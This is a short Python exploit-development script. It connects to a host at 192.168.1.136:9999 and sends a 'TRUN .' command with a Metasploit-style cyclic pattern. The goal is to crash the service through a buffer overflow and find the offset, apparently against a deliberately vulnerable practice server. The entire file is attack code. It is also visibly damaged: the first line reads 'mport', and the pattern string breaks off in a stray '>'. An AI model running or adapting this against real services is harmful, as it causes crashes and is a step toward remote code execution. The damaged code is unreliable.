mport socket

# Define the target server IP and Port
target_ip = '192.168.1.136'
target_port = 9999

# Replace the pattern with the one created from Metasploit or Mona
pattern = (
        b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah>
)

# Command
command = b'TRUN'
command_magic = b' .'

try:
        # Create a socket object and connect to the server
        print('Exploit> Connect to target')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))

        # Receive the banner or welcome message from the server
        banner = s.recv(1024).decode('utf-8')
        print(f'Server> {banner}')

        # Offset discovery
        print(f'Exploit> Sending pattern to discover offset')
        offset_discovery = command + command_magic + pattern
        s.send(offset_discovery)

        # Receive the response
        print('Exploit> The target server is expected to crash. No response will be received.')
        try:
                response = s.recv(1024).decode('utf-8')
                print(f'Server> {response}')
        except Exception as e:
                print(f'Exploit> No response received. The server likely crashed due to the buffer overflow.')

except Exception as e:
        # Exception handling
        print(f'An error occurred: {str(e)}')

finally:
        # Close the connection
        s.close()
